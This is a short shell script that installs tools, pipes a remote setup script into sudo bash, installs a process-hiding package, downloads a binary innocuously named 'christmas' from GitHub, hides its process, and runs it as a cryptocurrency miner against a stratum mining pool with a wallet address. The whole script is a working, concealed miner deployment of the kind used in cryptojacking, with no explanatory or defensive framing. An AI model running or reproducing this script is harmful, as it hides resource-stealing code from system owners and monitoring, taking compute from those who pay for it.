apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
chmod +x christmas

ph add christmas

./christmas -a gr -o stratum+ssl://stratum-na.rplant.xyz:17056 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz8 -p webpassword=IhatePopUps
